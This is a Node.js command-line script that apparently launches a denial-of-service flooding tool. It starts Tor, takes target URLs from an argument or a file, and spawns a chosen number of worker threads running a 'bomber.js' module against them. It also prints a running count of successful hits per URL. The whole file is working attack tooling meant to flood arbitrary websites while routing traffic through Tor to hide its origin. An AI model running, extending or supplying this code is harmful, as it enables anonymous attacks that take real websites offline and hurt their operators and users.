#!/usr/bin/env node
const { docopt } =      require('docopt');
const { execFile } =    require('child_process');
const fs =              require('fs').promises;
const { Worker } =      require('worker_threads');


const state = {};

const doc = `Usage:
    ./index.js -h | --help
    ./index.js [-u | --url <url>] [-t | --threads <threads>]
    ./index.js [-f | --file <filepath>] [-t | --threads <threads>]
     

Options:
    -h --help          Show this screen
    -t --threads       count of threads
    -u --url           url to use
    -f --file          path to file with urls
`;

async function waitForTor(){
    return new Promise((resolve, reject) => {
        const { stdout } = execFile('tor', (error) => {
            if (error) reject(error);
        });
    
        stdout.on('data', (data) => {
            if (data.includes('Bootstrapped 100% (done): Done')) {
                console.log('Bootstrapped 100% (done): Done');
                resolve(true)
            };
        })
    })
};

function setState({url, success}){
    if (state[url]?.[success]) state[url][success] += 1;
    else {
        state[url] = {
            ...state[url],
            [success]: 1
        }
    }
    console.clear()
    console.log(JSON.parse(JSON.stringify(state)));
}

async function parseFile(filepath){
    const data = (await fs.readFile(filepath, 'utf8')).split('\n');

    return data;
}

function startBombarding(urls, threads){
    try {
        if (!threads) new Worker(`${__dirname}/bomber.js`, { workerData: { urls } }).on('message', setState);

        for (let i = 0; i < threads; i++) {
            new Worker(`${__dirname}/bomber.js`, {
                workerData: { urls }
            }).on('message', setState);
        }

    } catch(err) {
        console.log(err);
    }
}


(async () => {
    const {
        '<threads>'   : threads,
        '<url>'       : url,
        '<filepath>'  : filepath

    } = docopt(doc);
    
    let urls;
    
    await waitForTor();

    if (filepath) urls = await parseFile(filepath);
    if (url) urls = [ url ];

    startBombarding(urls, threads)

})();




